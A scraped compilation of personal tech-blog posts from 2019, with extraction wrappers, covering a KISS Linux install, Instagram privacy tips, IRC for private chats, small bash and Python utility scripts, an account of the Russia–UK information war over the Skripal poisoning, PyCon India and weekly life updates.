tried Alpine’s kernel config but that was so huge and had a ton\nof modules and took far too long to build each time, much to my\nannoyance. Diffing their config and mine was about ~3000 lines! Too much\nto sift through. On a whim, I decided to scrap my entire KISS install\nand start afresh.\n\nFor some odd reason, after doing the exact same things I’d done\nearlier, my wireless worked this time. Ethernet didn’t, and still\ndoesn’t, but that’s ok.\n\nBuilding xorg-server was next, which took about an hour, mostly thanks\nto spotty internet. The build went through fine, though what wasn’t was\nno input after starting X. Adding my user to the input group wasn’t\nenough. The culprit this time was a missing xf86-xorg-input package.\nInstalling that gave me my mouse back, but not the keyboard!\n\nIt was definitely not the kernel this time, because I had a working\nkeyboard in the TTY.\n\nDay 4 & Day 5\n\nThis was probably the most annoying of all, since the fix was trivial.\nBy this point I had exhausted all ideas, so I decided to build my\nessential packages and setup my system. Building Firefox took nearly\n9 hours, the other stuff were much faster.\n\nI was still chatting on IRC during this, trying to zero down on what the\nproblem could be. And then:\n<dylanaraps> For starters I think st fails due to no fonts.\n\nHoly shit! Fonts. I hadn’t installed any fonts. Which is why none of\nthe applications I tried launching via sowm ever launched, and hence,\nI was lead to believe my keyboard was dead.\n\nWorth it?\n\nAbsolutely. I cannot stress on how much of a learning experience this\nwas. Also a test of my patience and perseverance, but yeah ok. I also\nthink that this distro is my endgame (yeah, right), probably because\nother distros will be nothing short of disappointing, in one way or\nanother.\n\nHuge thanks to the folks at #kisslinux on Freenode for helping me\nthroughout. And I mean, they really did. We chatted for hours on end\ntrying to debug my issues.\n\nI’ll now conclude with an obligatory screenshot.\n\n\n\n\n\n\n\n\nhttps://news.ycombinator.com/item?id=21021396\n\n\n\n'] at ['https://icyphox.sh/blog/five-days-tty']

I’ve even written a tiny\ndmenu wrapper\nfor it.\ntwsh: An incomplete twtxt client,\nin bash.

My\nplan for 2020 is to write one post a week — unrealistic, I know, but\nI will try nevertheless.\n\nI wrote about a bunch of things, ranging from programming to\nreturn-oriented-programming (heh), sysadmin and security stuff, and\na hint of culture and philosophy. Nice!\n\nThe Python for Reverse Engineering post got\na ton of attention on the interwebz, so that was cool.\n\nBye 2019\n\n2019 was super productive! (in my terms).

Found SUMMARY ['This entire sequence of events begins with the attempted poisoning of\nSergei Skripal1, an ex-GRU officer who was a double-agent for\nthe UK’s intelligence services. This hit attempt happened on the 4th of\nMarch, 2018. 8 days later, then-Prime Minister Theresa May formally\naccused Russia for the attack.\n\nThe toxin used in the poisoning was a nerve agent called Novichok.\nIn addition to the British military-research facility at Porton Down,\na small number of labs around the world were tasked with confirming\nPorton Down’s conclusions on the toxin that was used, by the OPCW\n(Organisation for the Prohibition of Chemical Weapons).\n\nWith the background on the matter out of the way, here are the different\ninstances of well timed disinformation pushed out by Moscow.\n\nThe Russian offense\n\nApril 14, 2018\n\n\nRT published an article claiming that Spiez had identified a different\ntoxin — BZ, and not Novichok.\nThis was an attempt to shift the blame from Russia (origin of Novichok),\nto NATO countries, where it was apparently in use.\nMost viral piece on the matter in all of 2018.\n\n\nAlthough technically correct, this isn’t the entire truth. As part of\nprotocol, the OPCW added a new substance to the sample as a test. If any\nof the labs failed to identify this substance, their findings were\ndeemed untrustworthy. This toxin was a derivative of BZ.\n\nHere are a few interesting things to note:\n\n\nThe entire process starting with the OPCW and the labs is top-secret.\nHow did Russia even know Speiz was one of the labs?\nOn April 11th, the OPCW mentioned BZ in a report confirming Porton\nDown’s findings. Note that Russia is a part of OPCW, and are fully\naware of the quality control measures in place. Surely they knew\nabout the reason for BZ’s use?\n\n\nRegardless, the Russian version of the story spread fast. They cashed in\non two major factors to plant this disinfo:\n\n\n“NATO bad” : Overused, but surprisingly works. People love a story\nthat goes full 180°.\nSpiez can’t defend itself: At the risk of revealing that it was one\nof the facilities testing the toxin, Spiez was only able to “not\ncomment”.\n\n\nApril 3, 2018\n\n\nThe Independent publishes a story based on an interview with the chief\nexecutive of Porton Down, Gary Aitkenhead.\nAitkenhead says they’ve identified Novichok but “have not identified\nthe precise source”.\nDays earlier, Boris Johnson (then-Foreign Secretary) claimed that\nPorton Down confirmed the origin of the toxin to be Russia.\nThis discrepancy was immediately promoted by Moscow, and its network\nall over.\n\n\nThis one is especially interesting because of how simple it is to\nexploit a small contradiction, that could’ve been an honest mistake.\nThis episode is also interesting because the British actually attempted\ndamage control this time. Porton Down tried to clarify Aitkenhead’s\nstatement via a tweet2:\n\n\nOur experts have precisely identified the nerve agent as a Novichok.\nIt is not, and has never been, our responsibility to confirm the source\nof the agent @skynews @UKmoments\n\n\nQuoting the Defense One\narticle on the matter:\n\n\nThe episode is seen by those inside Britain’s security communications team\nas the most serious misstep of the crisis, which for a period caused real\nconcern. U.K. officials told me that, in hindsight, Aikenhead could never\nhave blamed Russia directly, because that was not his job—all he was\nqualified to do was identify the chemical. Johnson, in going too far,\nwas more damaging. Two years on, he is now prime minister.\n\n\nMay 2018\n\n\nOPCW facilities receive an email from Spiez inviting them to\na conference.\nThe conference itself is real, and has been organized before.\nThe email however, was not — attached was a Word document containing\nmalware.\nAlso seen were inconsistencies in the email formatting, from what was\nnormal.\n\n\nThis spearphishing campaign was never offically attributed to Moscow,\nbut there are a lot of tells here that point to it being the work of\na state actor:\n\n\nAttack targetting a specific group of individuals.\nRelatively high level of sophistication — email formatting,\nmalicious Word doc, etc.\n\n\nHowever, the British NCSC have deemed with “high confidence” that the\nattack was perpetrated by GRU. In the UK intelligence parlance, “highly\nlikely” / “high confidence” usually means “definitely”.\n\nBritain’s defense\n\nSeptember 5, 2018\n\nThe UK took a lot of hits in 2018, but they eventually came back:\n\n\nMetropolitan Police has a meeting with the press, releasing their\nfindings.\nCCTV footage showing the two Russian hitmen was released.\nTraces of Novichok identified in their hotel room.\n\n\nThis sudden news explosion from Britan’s side completely\nbulldozed the information space pertaining to the entire event.\nAccording to Defense One:\n\n\nOnly two of the 10 most viral stories in the weeks following the announcement\nwere sympathetic to Russia, according to NewsWhip. Finally, officials recalled,\nit felt as though the U.K. was the aggressor. “This was all kept secret to\nput the Russians on the hop,” one told me. “Their response was all over the\nplace from this point. It was the turning point.”\n\n\nEarlier in April, 4 GRU agents were arrested in the Netherlands, who\nwere there to execute a cyber operation against the OPCW (located in The\nHague), via their WiFi networks. They were arrested by Dutch security,\nand later identifed as belonging to Unit 26165. They also seized a bunch\nof equipment from the room and their car.\n\n\nThe abandoned equipment revealed that the GRU unit involved had sent\nofficers around the world to conduct similar cyberattacks. They had\nbeen in Malaysia trying to steal information about the investigation\ninto the downed Malaysia Airlines Flight 17, and at a hotel in Lausanne,\nSwitzerland, where a World Anti-Doping Agency (WADA) conference was taking\nplace as Russia faced sanctions from the International Olympic Committee.\nBritain has said that the same GRU unit attempted to compromise Foreign\nOffice and Porton Down computer systems after the Skripal poisoning.\n\n\nOctober 4, 2018\n\nUK made the arrests public, published a list of infractions commited by\nRussia, along with the specific GRU unit that was caught.\n\nDuring this period, just one of the top 25 viral stories was from\na pro-Russian outlet, RT — that too a fairly straightforward piece.\n\nWrapping up\n\nAs with conventional warfare, it’s hard to determine who won. Britain\nmay have had the last blow, but Moscow — yet again—-depicted their\nfinesse in information warfare. Their ability to seize unexpected\nopenings, gather intel to facilitate their disinformation campaigns, and\ntheir cyber capabilities makes them a formidable threat.\n\n2020 will be fun, to say the least.\n\n\n\n\n\n\nhttps://en.wikipedia.org/wiki/Sergei_Skripal\n\nhttps://twitter.com/dstlmod/status/981220158680260613\n\n\n\n'] at ['https://icyphox.sh/blog/ru-vs-gb']

Found SUMMARY ['Which I am not, of course. But seeing as most of my peers are, I am\ncompelled to write this post. Using a social platform like Instagram\nautomatically implies that the user understands (to some level) that\ntheir personally identifiable information is exposed publicly, and they\nsign up for the service understanding this risk — or I think they do,\nanyway. But that’s about it, they go ham after that. Sharing every nitty\ngritty detail of their private lives without understanding the potential\nrisks of doing so.\n\nThe fundamentals of OPSEC dictacte that you develop a threat model, and\nInstgrammers are obviously incapable of doing that — so I’ll do it\nfor them.\n\nYour average Instagrammer’s threat model\n\nI stress on the word “average”, as in this doesn’t apply to those with\nmore than a couple thousand followers. Those type of accounts inherently\nface different kinds of threats — those that come with having\na celebrity status, and are not in scope of this analysis.\n\n\nState actors: This doesn’t really fit into our threat model,\nsince our target demographic is simply not important enough. That said,\nthere are select groups of individuals that operate on\nInstagram1, and they can potentially be targetted by a state\nactor.\n\n\n\nOSINT: This is probably the biggest threat vector, simply because\nof the amount of visual information shared on the platform. A lot can be\ngleaned from one simple picture in a nondescript alleyway. We’ll get\ninto this in the DOs and DON’Ts in a bit.\n\nFacebook & LE: Instagram is the last place you want to be doing an\nillegal, because well, it’s logged and more importantly — not\nend-to-end encrypted. Law enforcement can subpoena any and all account\ninformation. Quoting Instagram’s\npage on this:\n\n\n\na search warrant issued under the procedures described in the Federal\nRules of Criminal Procedure or equivalent state warrant procedures\nupon a showing of probable cause is required to compel the disclosure\nof the stored contents of any account, which may include messages,\nphotos, comments, and location information.\n\n\nThat out of the way, here’s a list of DOs and DON’Ts to keep in mind\nwhile posting on Instagram.\n\nDON’Ts\n\n\nUse Instagram for planning and orchestrating illegal shit! I’ve\nexplained why this is a terrible idea above. Use secure comms — even\nWhatsApp is a better choice, if you have nothing else. In fact, try\navoiding IG DMs altogether, use alternatives that implement E2EE.\n\nFilm live videos outside. Or try not to, if you can. You might\nunknowingly include information about your location: street signs,\nshops etc. These can be used to ascertain your current location.\n\nFilm live videos in places you visit often. This compromises your\nsecurity at places you’re bound to be at.\n\nShare your flight ticket in your story! I can’t stress this enough!!!\nSummer/winter break? “Look guys, I’m going home! Here’s where I live,\nand here’s my flight number — feel free to track me!”. This scenario is\nespecially worrisome because the start and end points are known to the\nthreat actor, and your arrival time can be trivially looked up — thanks\nto the flight number on your ticket. So, just don’t.\n\nPost screenshots with OS specific details. This might border on\npendantic, but better safe than sorry. Your phone’s statusbar and navbar\nare better cropped out of pictures. They reveal the time, notifications\n(apps that you use), and can be used to identify your phone’s operating\nsystem.  Besides, the status/nav bar isn’t very useful to your screenshot\nanyway.\n\nShare your voice. In general, reduce your footprint on the platform\nthat can be used to identify you elsewhere.\n\nThink you’re safe if your account is set to private. It doesn’t take\nmuch to get someone who follows you, to show show your profile on their\ndevice.\n\n\nDOs\n\n\nPost pictures that pertain to a specific location, once you’ve moved\nout of the location. Also applies to stories. It can wait.\n\nPost pictures that have been shot indoors. Or try to; reasons above.\nWho woulda thunk I’d advocate bathroom selfies?\n\nDelete old posts that are irrelevant to your current audience. Your\nfriends at work don’t need to know about where you went to high school.\n\n\nMore DON’Ts than DOs, that’s very telling. Here are a few more points\nthat are good OPSEC practices in general:\n\n\nThink before you share. Does it conform to the rules mentioned above?\nCompartmentalize. Separate as much as you can from what you share\nonline, from what you do IRL. Limit information exposure.\nAssess your risks: Do this often. People change, your environments\nchange, and consequentially the risks do too.\n\n\nFin\n\nInstagram is — much to my dismay—-far too popular for it to die any\ntime soon. There are plenty of good reasons to stop using the platform\naltogether (hint: Facebook), but that’s a discussion for another day.\n\nOr be like me:\n\n\n\nAnd that pretty much wraps it up, with a neat little bow.\n\n\n\n\n\n\nhttps://darknetdiaries.com/episode/51/ — Jack talks about Indian hackers who operate on Instagram.\n\n\n\n'] at ['https://icyphox.sh/blog/ig-opsec']

Also, Python is bloat.\nWill rewriting it fix that? That’s what I plan to find out. I have\na couple of choices of languages to use in the rewrite:\n\n\nC: Fast, compiled. Except I suck at it. (cite?)\nNim: My favourite, but I’ll have to write bindings to lowdown(1). (nite?)\nShell: Another favourite, muh “minimalsm”. No downside, really.\n(shite?)\n\n\nOh, and did I mention — I want it to be compatible with vite.\nI don’t want to have to redo my site structure or its templates. At the\nmoment, I rely on Jinja2 for templating, so I’ll need something similar.\n\nIRC bot\n\nMy earlier post on IRC for DMs got quite a bit of\ntraction, which was pretty cool.

Found SUMMARY ['Nerdy and I decided to try and use IRC for our\ndaily communications, as opposed to non-free alternatives like WhatsApp\nor Telegram. This is an account of how that went.\n\nThe status quo of instant messaging apps\n\nI’ve tried a ton of messaging applications — Signal, WhatsApp,\nTelegram, Wire, Jami (Ring), Matrix, Slack, Discord and more recently, DeltaChat.\n\nSignal: It straight up sucks on Android. Not to mention the\ncentralized architecture, and OWS’s refusal to federate.\n\nWhatsApp: Facebook’s spyware that people use without a second\nthought. The sole reason I have it installed is for University’s\nclass groups; I can’t wait to graduate.\n\nTelegram: Centralized architecture and a closed-source server. It’s\ngot a very nice Android client, though.\n\nJami: Distributed platform, free software. I am not going to comment\non this because I don’t recall what my experience was like, but I’m not\nusing it now… so if that’s indicative of anything.\n\nMatrix (Riot): Distributed network. Multiple client implementations.\nOverall, pretty great, but it’s slow. I’ve had messages not send / not\nreceived a lot of times. Matrix + Riot excels in group communication, but\nreally sucks for one-to-one chats.\n\nSlack / Discord: sigh\n\nDeltaChat: Pretty interesting idea — on paper. Using existing email\ninfrastructure for IM sounds great, but it isn’t all that cash in\npractice. Email isn’t instant, there’s always a delay of give or take\n5 to 10 seconds, if not more. This affects the flow of conversation.\nI might write a small blog post later, revewing DeltaChat.1\n\nWhy IRC?\n\nIt’s free, in all senses of the word. A lot of others have done a great\njob of answering this question in further detail, this is by far my\nfavourite:\n\nhttps://drewdevault.com/2019/07/01/Absence-of-features-in-IRC.html\n\nUsing IRC’s private messages\n\nThis was the next obvious choice, but personal message buffers don’t\npersist in ZNC and it’s very annoying to have to do a /query\nnerdypepper (Weechat) or to search and message a user via Revolution\nIRC. The only unexplored option — using a channel.\n\nSetting up a channel for DMs\n\nA fairly easy process:\n\n\nSet modes (on Rizon)2:\n#crimson [+ilnpstz 3]\n\nIn essence, this limits the users to 3 (one bot), sets the channel to invite only,\nhides the channel from /whois and /list, and a few other misc.\nmodes.\n\nNotifications: Also a trivial task; a quick modification to lnotify.py\nto send a notification for all messages in the specified buffer\n(#crimson) did the trick for Weechat. Revolution IRC, on the other\nhand, has an option to setup rules for notifications — super\nconvenient.\n\nA bot: Lastly, a bot for a few small tasks — fetching URL titles, responding\nto .np (now playing) etc. Writing an IRC bot is dead simple, and it\ntook me about an hour or two to get most of the basic functionality in\nplace. The source is here.\nIt is by no means “good code”; it breaks spectacularly from time to\ntime.\n\n\nIn conclusion\n\nAs the subtitle suggests, using IRC has been great. It’s probably not\nfor everyone though, but it fits my (and Nerdy’s) usecase perfectly.\n\nP.S.: I’m not sure why the footnotes are reversed.\n\n\n\n\n\n\nIt’s in queue.\n\nChannel modes on Rizon.\n\n\n\n'] at ['https://icyphox.sh/blog/irc-for-dms']

Side note: it’s a pretty\ngood show if you like police procedurals.\n\nThe problem\n\nConsider the following scenario:\n\n\nThere’s a local drug lord who’s been recruited to provide intel, by a certain 3-letter organization.\nLocal PD busts his operation and proceed to arrest him.\n3-letter org steps in, wants him released.\n\n\nSo here’s the thing, his presence is a threat to public but at the same time,\nhe can be a valuable long term asset — giving info on drug inflow, exchanges and perhaps even\nactionable intel on bigger fish who exist on top of the ladder. But he also\nseeks security. The 3-letter org must provide him with protection,\nin case he’s blown. And like in our case, they’d have to step in if he gets arrested.\n\nHerein lies the problem. How far should an intelligence organization go to protect an asset?\nWho matters more, the people they’ve sworn to protect, or the asset?\nBecause afterall, in the bigger picture, local PD and intel orgs are on the same side.\n\nThus, the question arises — how can we measure the “usefulness” of an\nasset to better quantify the tradeoff that is to be made?\nIs the intel gained worth the loss of public safety?\nThis question remains largely unanswered, and is quite the\npredicament should you find yourself in it.\n\nThis was a fairly short post, but an interesting problem to ponder\nnonetheless.\n'] at ['https://icyphox.sh/blog/intel-conundrum']

Found SUMMARY ['As a CS student, I see a lot of people around me doing courses online\nto learn to code. Don’t get me wrong — it probably works for some.\nEveryone learns differently. But that’s only going to get you so far.\nGreat you know the syntax, you can solve some competitive programming\nproblems, but that’s not quite enough, is it? The actual learning comes\nfrom applying it in solving actual problems — not made up ones.\n(inb4 some seething CP bro comes at me)\n\nNow, what’s an actual problem? Some might define it as real world\nproblems that people out there face, and solving it probably requires\nbuilding a product. This is what you see in hackathons, generally.\n\nIf you ask me, however, I like to define it as problems that you yourself\nface. This could be anything. Heck, it might not even be a “problem”. It\ncould just be an itch that you want to scratch. And this is where\nhacky scripts come in. Unclear? Let me illustrate with a few\nexamples.\n\nNow playing status in my bar\n\nIf you weren’t aware already — I rice my desktop. A lot. And a part of\nthis cohesive experience I try to create involves a status bar up at the\ntop of my screen, showing the time, date, volume and battery statuses etc.\n\nSo here’s the “problem”. I wanted to have my currently playing song\n(Spotify), show up on my bar. How did I approach this? A few ideas\npopped up in my head:\n\n\nSend playerctl’s STDOUT into my bar\nWrite a Python script to query Spotify’s API\nWrite a Python/shell script to query Last.fm’s API\n\n\nThe first approach bombed instantly. playerctl didn’t recognize my\nSpotify client and whined about some dbus issues to top it off.\nI spent a while in that rabbit hole but eventually gave up.\n\nMy next avenue was the Spotify Web API. One look at the docs and\nI realize that I’ll have to make more than one request to fetch the\nartist and track details. Nope, I need this to work fast.\n\nLast resort — Last.fm’s API. Spolier alert, this worked. Also, arguably\nthe best choice, since it shows the track status regardless of where\nthe music is being played. Here’s the script in its entirety:\n#!/usr/bin/env bash\n# now playing\n# requires the last.fm API key\n\nsource ~/.lastfm    # `export API_KEY="<key>"`\nfg="$(xres color15)"\nlight="$(xres color8)"\n\nUSER="icyphox"\nURL="http://ws.audioscrobbler.com/2.0/?method=user.getrecenttracks"\nURL+="&user=$USER&api_key=$API_KEY&format=json&limit=1&nowplaying=true"\nNOTPLAYING=" "    # I like to have it show nothing\nRES=$(curl -s $URL)\nNOWPLAYING=$(jq '.recenttracks.track[0]."@attr".nowplaying' <<< "$RES" | tr -d '"')\n\n\nif [[ "$NOWPLAYING" = "true" ]]\nthen\n\tTRACK=$(jq '.recenttracks.track[0].name' <<< "$RES" | tr -d '"')\n\tARTIST=$(jq '.recenttracks.track[0].artist."#text"' <<< "$RES" | tr -d '"')\n\techo -ne "%{F$light}$TRACK %{F$fg}by $ARTIST"\nelse\n\techo -ne "$NOTPLAYING"\nfi\n\nThe source command is used to fetch the API key which I store at\n~/.lastfm. The fg and light variables can be ignored, they’re only\nfor coloring output on my bar. The rest is fairly trivial and just\ninvolves JSON parsing with jq.\nThat’s it! It’s so small, but I learnt a ton. For those curious, here’s\nwhat it looks like running:\n\n\n\nUpdate latest post on the index page\n\nThis pertains to this very blog that you’re reading. I wanted a quick\nway to update the “latest post” section in the home page and the\nblog listing, with a link to the latest post. This would require\nediting the Markdown source\nof both pages.\n\nThis was a very\ninteresting challenge to me, primarily because it requires in-place\nediting of the file, not just appending. Sure, I could’ve come up with\nsome sed one-liner, but that didn’t seem very fun. Also I hate\nregexes. Did a lot of research (read: Googling) on in-place editing of\nfiles in Python, sorting lists of files by modification time etc. and\nthis is what I ended up on, ultimately:\n#!/usr/bin/env python3\n\nfrom markdown2 import markdown_path\nimport os\nimport fileinput\nimport sys\n\n# change our cwd\nos.chdir("bin")\n\nblog = "../pages/blog/"\n\n# get the most recently created file\ndef getrecent(path):\n    files = [path + f for f in os.listdir(blog) if f not in ["_index.md", "feed.xml"]]\n    files.sort(key=os.path.getmtime, reverse=True)\n    return files[0]\n\n# adding an entry to the markdown table\ndef update_index(s):\n    path = "../pages/_index.md"\n    with open(path, "r") as f:\n        md = f.readlines()\n    ruler = md.index("|  --  | --: |\\n")\n    md[ruler + 1] = s + "\\n"\n\n    with open(path, "w") as f:\n        f.writelines(md)\n\n# editing the md source in-place\ndef update_blog(s):\n    path = "../pages/blog/_index.md"\n    s = s + "\\n"\n    for l in fileinput.FileInput(path, inplace=1):\n        if "--:" in l:\n            l = l.replace(l, l + s)\n        print(l, end=""),\n\n\n# fetch title and date\nmeta = markdown_path(getrecent(blog), extras=["metadata"]).metadata\nfname = os.path.basename(os.path.splitext(getrecent(blog))[0])\nurl = "/blog/" + fname\nline = f"| [{meta['title']}]({url}) | `{meta['date']}` |"\n\nupdate_index(line)\nupdate_blog(line)\n\nI’m going to skip explaining this one out, but in essence, it’s one\nmassive hack. And in the end, that’s my point exactly. It’s very\nhacky, but the sheer amount I learnt by writing this ~50\nline script can’t be taught anywhere.\n\nThis was partially how\nvite was born. It was originally\nintended to be a script to build my site, but grew into a full-blown\nPython package. I could’ve just\nused an off-the-shelf static site generator\ngiven that there are so many of them, but\nI chose to write one myself.\n\nAnd that just about sums up what I wanted to say. The best and most fun\nway to learn to code — write hacky scripts. You heard it here.\n'] at ['https://icyphox.sh/blog/hacky-scripts']

In essence, here’s\nwhat I did:\n#!/usr/bin/env bash\n\ngit push origin master\n# push contents of `build/` to the `gh-pages` branch\ngit subtree push --prefix build origin gh-pages\n\nI can now simply push to master, and Netlify generates a build for me\nby installing vite, and running vite\nbuild. Very pleasant.\n\nmnmlwm’s status\n\nmnmlwm, for those unaware, is my pet project which aims to be a simple\nwindow manager written in Nim. I’d taken a break from it for a while\nbecause Xlib is such a pain to work with (or I’m just dense). Anyway,\nI’m planning on getting back to it, with some fresh inspiration from\nDylan Araps’ sowm.\n\nOther\n\nI’ve been reading a lot of manga lately. Finished Kekkon Yubiwa\nMonogatari (till the latest chapter) and Another, and I’ve just\nstarted Kakegurui. I’ll reserve my opinions for when I update the\nreading log.\n\nThat’s about it, and I’ll see you — definitely not next week.\n'] at ['https://icyphox.sh/blog/2019-10-16']

Found SUMMARY ['I’m writing this article as I sit in class, back on the grind. Last\nweekend — Oct 12th and 13th—-was PyCon India 2019, in Chennai, India.\nIt was my first PyCon, and my first ever talk at a major conference!\nThis is an account of the all the cool stuff I saw, people I met and the\ntalks I enjoyed.\nForgive the lack of pictures — I prefer living the moment through my\neyes.\n\nTalks\n\nSo much ML! Not that it’s a bad thing, but definitely interesting to\nnote. From what I counted, there were about 17 talks tagged under “Data\nScience, Machine Learning and AI”. I’d have liked to see more talks\ndiscussing security and privacy, but hey, the organizers can only pick\nfrom what’s submitted. ;)\n\nWith that point out of the way, here are some of the talks I really liked:\n\n\nPython Packaging – where we are and where we’re headed by Pradyun\nMicropython: Building a Physical Inventory Search Engine by Vinay\nRagabot – Music Encoded by Vikrant\nLet’s Hunt a Memory Leak by Sanket\noh and of course, David Beazley’s closing\nkeynote\n\n\nMy talk (!!!)\n\nMy good buddy Raghav and I spoke about\nour smart lock security research. Agreed, it might have been less\n“hardware” and more of a bug on the server-side, but that’s the thing\nabout IoT right? It’s so multi-faceted, and is an amalgamation of so\nmany different hardware and software stacks. But, anyway…\n\nI was reassured by folks after the talk that the silence during Q/A was\nthe “good” kind of silence. Was it really? I’ll never know.\n\nSome nice people I met\n\n\nAbhirath — A 200 IQ lad. Talked to\nme about everything from computational biology to the physical\nimplementation of quantum computers.\nAbin — He recognized me from my\nr/unixporn posts, which was pretty\nawesome.\nAbhishek\nPradyun and Vikrant (linked earlier)\n\n\nAnd a lot of other people doing really great stuff, whose names I’m\nforgetting.\n\nPictures!\n\nIt’s not much, and\nI can’t be bothered to format them like a collage or whatever, so I’ll\njust dump them here — as is.\n\n\n\n\n\n\nC’est tout\n\nOverall, a great time and a weekend well spent. It was very different\nfrom your typical security conference — a lot more chill, if you\nwill. The organizers did a fantastic job and the entire event was put\ntogether really well.\nI don’t have much else to say, but I know for sure that I’ll be\nthere next time.\n\nThat was PyCon India, 2019.\n'] at ['https://icyphox.sh/blog/pycon-wrap-up']

Found SUMMARY ['Ah yes, yet another article on the internet on this beaten to death\nsubject. But this is inherently different, since it’s my opinion on\nthe matter, and my technique(s) to achieve “digital minimalism”.\n\nAccording to me, minimalism can be achieved on two primary fronts —\nthe phone & the computer. Let’s start with the phone. The daily carry.\nThe device that’s on our person from when we get out of bed, till we get\nback in bed.\n\nThe phone\n\nI’ve read about a lot of methods people employ to curb their phone\nusage. Some have tried grouping “distracting” apps into a separate\nfolder, and this supposedly helps reduce their usage. Now, I fail to see\nhow this would work, but YMMV. Another technique I see often is using\na time governance app — like OnePlus’ Zen Mode—-to enforce how much\ntime you spend using specific apps, or the phone itself. I’ve tried this\nfor myself, but I constantly found myself counting down the minutes\nafter which the phone would become usable again. Not helpful.\n\nMy solution to this is a lot more brutal. I straight up uninstalled the\napps that I found myself using too often. There’s a simple principle\nbehind it — if the app has a desktop alternative, like Twitter,\nReddit, etc. use that instead. Here’s a list of apps that got nuked from\nmy phone:\n\n\nTwitter\nInstagram (an exception, no desktop client)\nRelay for Reddit\nYouTube (disabled, ships with stock OOS)\n\n\nThe only non-productive app that I’ve let remain is Clover,\na 4chan client. I didn’t find myself using it as much earlier, but we’ll see how that\nholds up. I’ve also allowed my personal messaging apps to remain, since\nremoving those would be inconveniencing others.\n\nI must admit, I often find myself reaching for my phone out of habit\njust to check Twitter, only to find that its gone. I also subconsciously\ntap the place where its icon used to exist (now replaced with my mail\nclient) on my launcher. The only “fun” thing left on my phone to do is\nread or listen to music. Which is okay, in my opinion.\n\nThe computer\n\nI didn’t do anything too nutty here, and most of the minimalism is\nmostly aesthetic. I like UIs that get out of the way.\n\nMy setup right now is just a simple bar at the top showing the time,\ndate, current volume and battery %, along with my workspace indicators.\nNo fancy colors, no flashy buttons and sliders. And that’s it. I don’t\ntry to force myself to not use stuff — after all, I’ve reduced it\nelsewhere. :)\n\nNow the question arises: Is this just a phase, or will I stick to it?\nWhat’s going to stop me from heading over to the Play Store and\ninstalling those apps back? Well, I never said this was going to be\neasy. There’s definitely some will power needed to pull this off.\nI guess time will tell.\n'] at ['https://icyphox.sh/blog/digital-minimalism']

Found SUMMARY ['It’s a lazy Friday afternoon here; yet another off day this week thanks to my\nuni’s fest. My last “weekly” update was 10 days ago, and a lot has happened\nsince then. Let’s get right into it!\n\nMy switch to Alpine\n\nPreviously, I ran Debian with Buster/Sid repos, and ever since this happened\n$ dpkg --list | wc -l\n3817\n\n# or something in that ballpark\n\nI’ve been wanting to reduce my system’s package count.\n\nThus, I began my search for a smaller, simpler and lighter distro with a fairly\nsane package manager. I did come across Dylan Araps’\nKISS Linux project, but it seemed a little too hands-on\nfor me (and still relatively new). I finally settled on\nAlpine Linux. According to their website:\n\n\nAlpine Linux is a security-oriented, lightweight Linux distribution based\non musl libc and busybox.\n\n\nThe installation was a breeze, and I was quite surprised to see WiFi working\nOOTB. In the past week of my using this distro, the only major hassle I faced\nwas getting my Minecraft launcher to run. The JRE isn’t fully ported to musl\nyet.1 The solution to that is fairly trivial and I plan to write about it\nsoon. (hint: it involves chroots)\n\n\n\nPackaging for Alpine\n\nOn a related note, I’ve been busy packaging some of the stuff I use for Alpine\n— you can see my personal aports\nrepository if you’re interested. I’m currently working on packaging Nim too, so\nkeep an eye out for that in the coming week.\n\nTalk selection at PyCon India!\n\nYes! My buddy Raghav (@_vologue) and I are\ngoing to be speaking at PyCon India about our recent smart lock security\nresearch. The conference is happening in Chennai, much to our convenience.\nIf you’re attending too, hit me up on Twitter and we can hang!\n\nOther\n\nThat essentially sums up the technical stuff that I did. My Russian is going\nstrong, my reading however, hasn’t. I have yet to finish those books! This\nweek, for sure.\n\nMusically, I’ve been experimenting. I tried a bit of hip-hop and chilltrap, and\nI think I like it? I still find myself coming back to metalcore/deathcore.\nHere’s a list of artists I discovered (and liked) recently:\n\n\nBefore I Turn\n生 Conform 死 (couldn’t find any official YouTube video, check Spotify)\nTreehouse Burning\nLee McKinney\nBerried Alive (rediscovered)\n\n\nThat’s it for now, I’ll see you next week!\n\n\n\n\n\n\nThe Portola Project\n\n\n\n'] at ['https://icyphox.sh/blog/2019-09-27']

Found SUMMARY ['This is something new I’m trying out, in an effort to write more frequently\nand to serve as a log of how I’m using my time. In theory, I will write this post\nevery week. I’ll need someone to hold me accountable if I don’t. I have yet to decide on\na format for this, but it will probably include a quick summary of the work I did,\nthings I read, IRL stuff, etc.\n\nWith the meta stuff out of the way, here’s what went down last week!\n\nMy discovery of the XXIIVV webring\n\nDid you notice the new fidget-spinner-like logo at the bottom? Click it! It’s a link to\nthe XXIIVV webring. I really like the idea of webrings.\nIt creates a small community of sites and enables sharing of traffic among these sites.\nThe XXIIVV webring consists mostly of artists, designers and developers and gosh, some\nof those sites are beautiful. Mine pales in comparison.\n\nThe webring also has a twtxt echo chamber aptly\ncalled The Hallway. twtxt is a fantastic project\nand its complexity-to-usefulness ratio greatly impresses me. You can find my personal\ntwtxt feed at /twtxt.txt (root of this site).\n\nWhich brings me to the next thing I did this/last week.\n\ntwsh: a twtxt client written in Bash\n\nI’m not a fan of the official Python client, because you know, Python is bloat.\nAs an advocate of mnmlsm, I can’t use it in good conscience. Thus, began my\nauthorship of a truly mnml client in pure Bash. You can find it here.\nIt’s not entirely useable as of yet, but it’s definitely getting there, with the help\nof @nerdypepper.\n\nOther\n\nI have been listening to my usual podcasts: Crime Junkie, True Crime Garage,\nDarknet Diaries & Off the Pill. To add to this list, I’ve begun binging Vice’s CYBER.\nIt’s pretty good — each episode is only about 30 mins and it hits the sweet spot,\ndelvering both interesting security content and news.\n\nMy reading needs a ton of catching up. Hopefully I’ll get around to finishing up\n“The Unending Game” this week. And then go back to “Terrorism and Counterintelligence”.\n\nI’ve begun learning Russian! I’m really liking it so far, and it’s been surprisingly\neasy to pick up. Learning the Cyrillic script will require some relearning, especially\nwith letters like в, н, р, с, etc. that look like English but sound entirely different.\nI think I’m pretty serious about learning this language — I’ve added the Russian keyboard\nto my Google Keyboard to aid in my familiarization of the alphabet. I’ve added the RU\nlayout to my keyboard map too:\nsetxkbmap -option 'grp:alt_shift_toggle' -layout us,ru\n\nWith that ends my weekly update, and I’ll see you next week!\n'] at ['https://icyphox.sh/blog/2019-09-17']

